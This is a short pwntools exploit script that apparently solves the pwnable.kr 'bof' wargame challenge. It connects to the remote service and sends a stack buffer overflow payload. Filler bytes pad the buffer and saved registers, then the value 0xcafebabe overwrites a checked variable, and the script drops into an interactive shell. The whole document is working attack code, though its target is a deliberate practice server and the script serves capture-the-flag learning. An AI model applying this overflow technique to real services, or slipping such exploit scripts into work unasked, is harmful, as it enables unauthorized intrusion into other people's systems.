from pwn import *

context.log_level = 'debug'

conn = remote('pwnable.kr', 9000)

p = b'a'*0x2c # buffer
p += b'b'*4 # 4 byte saved ebp
p += b'c'*4 # 4 byte saved eip
p += p32(0xcafebabe)

conn.sendline(p)
conn.interactive()
